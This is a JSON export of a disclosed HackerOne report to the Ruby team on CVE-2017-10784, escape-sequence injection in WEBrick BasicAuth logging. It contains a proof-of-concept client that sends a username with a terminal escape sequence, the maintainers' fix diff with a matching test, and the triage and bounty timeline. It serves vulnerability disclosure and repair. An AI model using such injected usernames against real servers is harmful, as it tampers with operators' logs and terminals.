{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-09-15T05:25:52.520Z", 
    "voters": [
        "bl4de", 
        "eveeez", 
        "mr_r3boot", 
        "craxerbikash"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 223363, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-09-15T05:29:39.657Z", 
    "vulnerability_information": "WEBrick BasicAuth outputs any non-existing user name to logs without sanitizing.  By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as [the old already-fixed vulnerability](https://www.ruby-lang.org/en/news/2010/01/10/webrick-escape-sequence-injection/).\n\nHow to reproduce:\n\n1) Run this WEBrick server program in a terminal.\n\n~~~~\nrequire \"webrick\"\nrequire \"webrick/httpauth\"\n\nsrv = WEBrick::HTTPServer.new({ Port: 34567 })\ndb = WEBrick::HTTPAuth::Htpasswd.new(\"dot.htpasswd\")\nauthenticator = WEBrick::HTTPAuth::BasicAuth.new(UserDB: db, Realm: \"realm\")\nsrv.mount_proc(\"/\") do |req, res|\n  authenticator.authenticate(req, res)\n  res.body = \"foobar\"\nend\nsrv.start\n~~~~\n\n2) Run this attack access program in another terminal.\n\n~~~~\nrequire \"open-uri\"\n\nopen(\"http://localhost:34567/login\",\n  http_basic_authentication: [\n      \"ESCAPE SEQUENCE HERE->\\e]2;BOOM!\\a<-SEE WINDOW TITLE\",\n      \"passwd\"\n]).read\n~~~~\n\n3) See the first terminal that runs the server.  You will see a line like this, and its window title changed \"BOOM!\".\n\n~~~~\n[2017-04-24 19:23:46] ERROR Basic realm: ESCAPE SEQUENCE HERE-><-SEE WINDOW TITLE: the user is not allowed.\n~~~~\n\nNote: I'm a member of the ruby-core team, but I'm not involved with development of WEBrick.  I did not create the bug, of course.  I will happily accept any bounty if any :-)", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "low", 
            "privileges_required": "none", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "low", 
            "availability": "low"
        }, 
        "rating": "medium", 
        "score": 6.3, 
        "author_type": "User"
    }, 
    "title": "Escape sequence injection vulnerability in WEBrick BasicAuth", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-10-15T05:25:52.558Z", 
    "state": "Closed", 
    "cve_ids": [
        "CVE-2017-10784"
    ], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-06-17T16:26:30.664Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-17T16:26:30.664Z", 
            "actor": {
                "username": "mame", 
                "url": "/mame", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "A proof-of-concept patch.  What do you think?\n\n~~~\ndiff --git a/lib/webrick/httpstatus.rb b/lib/webrick/httpstatus.rb\nindex ded5aa2e60..0630219ada 100644\n--- a/lib/webrick/httpstatus.rb\n+++ b/lib/webrick/httpstatus.rb\n@@ -23,10 +23,6 @@ module HTTPStatus\n     ##\n     # Root of the HTTP status class hierarchy\n     class Status < StandardError\n-      def initialize(*args) # :nodoc:\n-        args[0] = AccessLog.escape(args[0]) unless args.empty?\n-        super(*args)\n-      end\n       class << self\n         attr_reader :code, :reason_phrase # :nodoc:\n       end\ndiff --git a/lib/webrick/log.rb b/lib/webrick/log.rb\nindex 7542d8f79a..41e907cd3b 100644\n--- a/lib/webrick/log.rb\n+++ b/lib/webrick/log.rb\n@@ -118,10 +118,10 @@ def debug?; @level >= DEBUG; end\n     # * Otherwise it will return +arg+.inspect.\n     def format(arg)\n       if arg.is_a?(Exception)\n-        \"#{arg.class}: #{arg.message}\\n\\t\" <<\n+        \"#{arg.class}: #{AccessLog.escape(arg.message)}\\n\\t\" <<\n         arg.backtrace.join(\"\\n\\t\") << \"\\n\"\n       elsif arg.respond_to?(:to_str)\n-        arg.to_str\n+        AccessLog.escape(arg.to_str)\n       else\n         arg.inspect\n       end\ndiff --git a/test/webrick/test_httpauth.rb b/test/webrick/test_httpauth.rb\nindex 126bc6ee54..2ee492db7a 100644\n--- a/test/webrick/test_httpauth.rb\n+++ b/test/webrick/test_httpauth.rb\n@@ -103,6 +103,42 @@ def test_basic_auth3\n     }\n   end\n \n+  def test_bad_username_with_control_characters\n+    log_tester = lambda {|log, access_log|\n+      assert_equal(2, log.length)\n+      assert_match(/ERROR Basic WEBrick's realm: foo\\\\ebar: the user is not allowed./, log[0])\n+      assert_match(/ERROR WEBrick::HTTPStatus::Unauthorized/, log[1])\n+    }\n+    TestWEBrick.start_httpserver({}, log_tester) {|server, addr, port, log|\n+      realm = \"WEBrick's realm\"\n+      path = \"/basic_auth\"\n+\n+      Tempfile.create(\"test_webrick_auth\") {|tmpfile|\n+        tmpfile.close\n+        tmp_pass = WEBrick::HTTPAuth::Htpasswd.new(tmpfile.path)\n+        tmp_pass.set_passwd(realm, \"webrick\", \"supersecretpassword\")\n+        tmp_pass.set_passwd(realm, \"foo\", \"supersecretpassword\")\n+        tmp_pass.flush\n+\n+        htpasswd = WEBrick::HTTPAuth::Htpasswd.new(tmpfile.path)\n+        users = []\n+        htpasswd.each{|user, pass| users << user }\n+        server.mount_proc(path){|req, res|\n+          auth = WEBrick::HTTPAuth::BasicAuth.new(\n+            :Realm => realm, :UserDB => htpasswd,\n+            :Logger => server.logger\n+          )\n+          auth.authenticate(req, res)\n+          res.body = \"hoge\"\n+        }\n+        http = Net::HTTP.new(addr, port)\n+        g = Net::HTTP::Get.new(path)\n+        g.basic_auth(\"foo\\ebar\", \"passwd\")\n+        http.request(g){|res| assert_not_equal(\"hoge\", res.body, log.call) }\n+      }\n+    }\n+  end\n+\n   DIGESTRES_ = /\n     ([a-zA-Z\\-]+)\n       [ \\t]*(?:\\r\\n[ \\t]*)*\n~~~", 
            "markdown_message": "<p>A proof-of-concept patch.  What do you think?</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff --git a/lib/webrick/httpstatus.rb b/lib/webrick/httpstatus.rb\nindex ded5aa2e60..0630219ada 100644\n</span><span class=\"gd\">--- a/lib/webrick/httpstatus.rb\n</span><span class=\"gi\">+++ b/lib/webrick/httpstatus.rb\n</span><span class=\"gu\">@@ -23,10 +23,6 @@ module HTTPStatus\n</span>     ##\n     # Root of the HTTP status class hierarchy\n     class Status &lt; StandardError\n<span class=\"gd\">-      def initialize(*args) # :nodoc:\n-        args[0] = AccessLog.escape(args[0]) unless args.empty?\n-        super(*args)\n-      end\n</span>       class &lt;&lt; self\n         attr_reader :code, :reason_phrase # :nodoc:\n       end\n<span class=\"gh\">diff --git a/lib/webrick/log.rb b/lib/webrick/log.rb\nindex 7542d8f79a..41e907cd3b 100644\n</span><span class=\"gd\">--- a/lib/webrick/log.rb\n</span><span class=\"gi\">+++ b/lib/webrick/log.rb\n</span><span class=\"gu\">@@ -118,10 +118,10 @@ def debug?; [@level](/level) &gt;= DEBUG; end\n</span>     # * Otherwise it will return +arg+.inspect.\n     def format(arg)\n       if arg.is_a?(Exception)\n<span class=\"gd\">-        &quot;#{arg.class}: #{arg.message}\\n\\t&quot; &lt;&lt;\n</span><span class=\"gi\">+        &quot;#{arg.class}: #{AccessLog.escape(arg.message)}\\n\\t&quot; &lt;&lt;\n</span>         arg.backtrace.join(&quot;\\n\\t&quot;) &lt;&lt; &quot;\\n&quot;\n       elsif arg.respond_to?(:to_str)\n<span class=\"gd\">-        arg.to_str\n</span><span class=\"gi\">+        AccessLog.escape(arg.to_str)\n</span>       else\n         arg.inspect\n       end\n<span class=\"gh\">diff --git a/test/webrick/test_httpauth.rb b/test/webrick/test_httpauth.rb\nindex 126bc6ee54..2ee492db7a 100644\n</span><span class=\"gd\">--- a/test/webrick/test_httpauth.rb\n</span><span class=\"gi\">+++ b/test/webrick/test_httpauth.rb\n</span><span class=\"gu\">@@ -103,6 +103,42 @@ def test_basic_auth3\n</span>     }\n   end\n\n<span class=\"gi\">+  def test_bad_username_with_control_characters\n+    log_tester = lambda {|log, access_log|\n+      assert_equal(2, log.length)\n+      assert_match(/ERROR Basic WEBrick&#39;s realm: foo\\\\ebar: the user is not allowed./, log[0])\n+      assert_match(/ERROR WEBrick::HTTPStatus::Unauthorized/, log[1])\n+    }\n+    TestWEBrick.start_httpserver({}, log_tester) {|server, addr, port, log|\n+      realm = &quot;WEBrick&#39;s realm&quot;\n+      path = &quot;/basic_auth&quot;\n+\n+      Tempfile.create(&quot;test_webrick_auth&quot;) {|tmpfile|\n+        tmpfile.close\n+        tmp_pass = WEBrick::HTTPAuth::Htpasswd.new(tmpfile.path)\n+        tmp_pass.set_passwd(realm, &quot;webrick&quot;, &quot;supersecretpassword&quot;)\n+        tmp_pass.set_passwd(realm, &quot;foo&quot;, &quot;supersecretpassword&quot;)\n+        tmp_pass.flush\n+\n+        htpasswd = WEBrick::HTTPAuth::Htpasswd.new(tmpfile.path)\n+        users = []\n+        htpasswd.each{|user, pass| users &lt;&lt; user }\n+        server.mount_proc(path){|req, res|\n+          auth = WEBrick::HTTPAuth::BasicAuth.new(\n+            :Realm =&gt; realm, :UserDB =&gt; htpasswd,\n+            :Logger =&gt; server.logger\n+          )\n+          auth.authenticate(req, res)\n+          res.body = &quot;hoge&quot;\n+        }\n+        http = Net::HTTP.new(addr, port)\n+        g = Net::HTTP::Get.new(path)\n+        g.basic_auth(&quot;foo\\ebar&quot;, &quot;passwd&quot;)\n+        http.request(g){|res| assert_not_equal(&quot;hoge&quot;, res.body, log.call) }\n+      }\n+    }\n+  end\n+\n</span>   DIGESTRES_ = /\n     ([a-zA-Z\\-]+)\n       [ \\t]*(?:\\r\\n[ \\t]*)*\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 1763296, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-25T01:58:51.573Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-25T01:58:51.573Z", 
            "actor": {
                "username": "mame", 
                "url": "/mame", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "I\u2019m sorry to be pressing, but I'd like to hear your opinion.", 
            "markdown_message": "<p>I\u2019m sorry to be pressing, but I&#39;d like to hear your opinion.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1779111, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T11:53:03.567Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T11:53:03.567Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "@mame We confirmed your report. but it does not need to immediately release. Because webrick is not major http server in the production environment of web services.", 
            "markdown_message": "<p><a href=\"/mame\">@mame</a> We confirmed your report. but it does not need to immediately release. Because webrick is not major http server in the production environment of web services.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1780517, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T12:09:13.166Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T12:09:13.166Z", 
            "actor": {
                "username": "mame", 
                "url": "/mame", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "@hsbt Thank you for your reply.  I see.\n\nIs WEBrick no longer suitable for production?  I personally agreed, but I think there is no consensus in the ruby community yet.  We should state it officially.", 
            "markdown_message": "<p><a href=\"/hsbt\">@hsbt</a> Thank you for your reply.  I see.</p>\n\n<p>Is WEBrick no longer suitable for production?  I personally agreed, but I think there is no consensus in the ruby community yet.  We should state it officially.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1780541, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-30T20:30:28.733Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-30T20:30:28.733Z", 
            "actor": {
                "username": "usa", 
                "url": "/usa", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/084/616/cb6bcd164f038c6f0e1744fba088eeded2566fa4_medium.png?1532440230"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Now I'm requesting to assign a CVE number for this issue.", 
            "markdown_message": "<p>Now I&#39;m requesting to assign a CVE number for this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1795144, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-02T10:32:41.880Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-02T10:32:41.880Z", 
            "actor": {
                "username": "usa", 
                "url": "/usa", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/084/616/cb6bcd164f038c6f0e1744fba088eeded2566fa4_medium.png?1532440230"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "cve_ids": [
                "CVE-2017-10784"
            ], 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::CveIdAdded", 
            "id": 1797453, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-02T10:33:01.129Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-02T10:33:01.129Z", 
            "actor": {
                "username": "usa", 
                "url": "/usa", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/084/616/cb6bcd164f038c6f0e1744fba088eeded2566fa4_medium.png?1532440230"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "CVE number assigned", 
            "markdown_message": "<p>CVE number assigned</p>\n", 
            "type": "Activities::Comment", 
            "id": 1797454, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "mame", 
                "url": "/mame"
            }, 
            "created_at": "2017-09-15T02:33:54.370Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-15T02:33:54.370Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "We released new versions of ruby resolved this vurnerablity.", 
            "markdown_message": "<p>We released new versions of ruby resolved this vurnerablity.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1998524, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-09-15T02:34:10.086Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-15T02:34:10.086Z", 
            "actor": {
                "url": "/ruby", 
                "profile": {
                    "name": "Ruby"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
                }
            }, 
            "team_handle": "ruby", 
            "bonus_amount": "0.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "mame", 
                "url": "/mame"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1998525, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-15T05:25:52.542Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-15T05:25:52.542Z", 
            "actor": {
                "username": "mame", 
                "url": "/mame", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1998654, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-15T05:29:39.673Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-15T05:29:39.673Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1998658, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-15T05:29:39.754Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-15T05:29:39.754Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1998659, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "mame", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/mame", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 58, 
        "name": "Command Injection - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -36090410.923768304, 
    "disclosed_at": "2017-09-15T05:29:39.737Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/223363", 
    "created_at": "2017-04-24T10:25:41.154Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>WEBrick BasicAuth outputs any non-existing user name to logs without sanitizing.  By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as <a href=\"/redirect?signature=436c39d311fad29a8df865b51a3d861206005df3&amp;url=https%3A%2F%2Fwww.ruby-lang.org%2Fen%2Fnews%2F2010%2F01%2F10%2Fwebrick-escape-sequence-injection%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>the old already-fixed vulnerability</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>How to reproduce:</p>\n\n<p>1) Run this WEBrick server program in a terminal.</p>\n<pre class=\"highlight plaintext\"><code>require &quot;webrick&quot;\nrequire &quot;webrick/httpauth&quot;\n\nsrv = WEBrick::HTTPServer.new({ Port: 34567 })\ndb = WEBrick::HTTPAuth::Htpasswd.new(&quot;dot.htpasswd&quot;)\nauthenticator = WEBrick::HTTPAuth::BasicAuth.new(UserDB: db, Realm: &quot;realm&quot;)\nsrv.mount_proc(&quot;/&quot;) do |req, res|\n  authenticator.authenticate(req, res)\n  res.body = &quot;foobar&quot;\nend\nsrv.start\n</code></pre>\n<p>2) Run this attack access program in another terminal.</p>\n<pre class=\"highlight plaintext\"><code>require &quot;open-uri&quot;\n\nopen(&quot;http://localhost:34567/login&quot;,\n  http_basic_authentication: [\n      &quot;ESCAPE SEQUENCE HERE-&gt;\\e]2;BOOM!\\a&lt;-SEE WINDOW TITLE&quot;,\n      &quot;passwd&quot;\n]).read\n</code></pre>\n<p>3) See the first terminal that runs the server.  You will see a line like this, and its window title changed &quot;BOOM!&quot;.</p>\n<pre class=\"highlight plaintext\"><code>[2017-04-24 19:23:46] ERROR Basic realm: ESCAPE SEQUENCE HERE-&gt;&lt;-SEE WINDOW TITLE: the user is not allowed.\n</code></pre>\n<p>Note: I&#39;m a member of the ruby-core team, but I&#39;m not involved with development of WEBrick.  I did not create the bug, of course.  I will happily accept any bounty if any :-)</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.ruby-lang.org", 
            "about": "A Programmer's Best Friend", 
            "twitter_handle": "", 
            "name": "Ruby"
        }, 
        "handle": "ruby", 
        "url": "https://hackerone.com/ruby", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/724/36e273f967b252ae8b4051d09ffc08f7de16d7d5_small.png?1449271894", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 7724, 
        "default_currency": "usd"
    }, 
    "is_published": false
}